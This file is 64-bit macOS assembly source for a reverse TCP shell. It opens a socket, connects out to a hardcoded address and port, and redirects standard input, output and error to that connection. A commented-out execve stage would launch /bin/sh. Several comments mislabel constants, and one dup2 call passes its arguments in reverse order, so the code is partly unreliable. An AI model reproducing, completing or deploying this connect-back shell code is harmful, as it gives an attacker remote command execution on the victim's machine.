;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_shell -e start reverse_tcp.o

BITS 64
    
section .text
global start

start:
;a:
 	xor rbx, rbx
	xor rdx, rdx

;Socket
	mov rax, 0x2000061 ;97 AUE_SOCKET  ALL { int socket(int domain, int type, int protocol); }
	mov rdi, 2 ;SOCK_STREAM
	mov rsi, 1 ;AF_NET
	mov rdx, rdx ;0
	syscall

	mov r12, rax ; Save the socket

;Sock_addr
	;      10696910 <-start
	;push 0x0a45450a ;IP
	;push 0x270F ;PORT
	;push 0x0201 ;AF_INET
	mov r13, 0x0345450A5C110002
	;mov r13, 0x0A45450A5C110002
	push r13
	mov r13, rsp
	;push rsi
	;mov rsi, 0x0100007F5C110002
	;move rsi, 

	;mov rsi, rsp

;Connect
	mov rax, 0x2000062 ;98 AUE_CONNECT ALL { int connect(int s, caddr_t name, socklen_t namelen); 
	mov rdi, r12 
	mov rsi, r13
	mov rdx, 16
	syscall

;dup2
	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
	mov rdi, 0
	mov rsi, r12
	syscall	

	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
	mov rdi, r12
	mov rsi, 1
	syscall	

	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
	mov rdi, r12
	mov rsi, 2
	syscall	

	mov r13, rax

;	jmp short c

;b:
;59	AUE_EXECVE	ALL	{ int execve(char *fname, char **argp, char **envp); } 
;Exec
; 	pop rdi                ; pop ret addr which = addr of /bin/sh
; 	mov rax, 0x200003B            ; syscall number in rax
; 	xor rdx, rdx           ; zero out rdx
; 	push rdx               ; null terminate rdi, pushed backwards
; 	push rdi               ; push rdi = pointer to /bin/sh
; 	mov rsi, rsp           ; pointer to null terminated /bin/sh string
; 	syscall                ; invoke the kernel

;    mov r8, '/bin/sh'
;    push r8
;    mov rdi, rsp 

;    mov rax, 0x200003B ;59 AUE_EXECVE  ALL { int execve(char *fname, char **argp, char **envp); }
;    xor rsi, rsi 
;    xor rdx, rdx 
;    syscall

;c:
;	call b
;	db '/bin//sh'

;Close
;	mov rax, 0x2000006
;	mov rdi, r12
;	syscall

;Exit

	mov rdi, rax
	mov rax, 0x2000001      ; System call number for exit = 1
	mov rdi, r13              ; Exit success = 0
	syscall                 ; Invoke the kernel

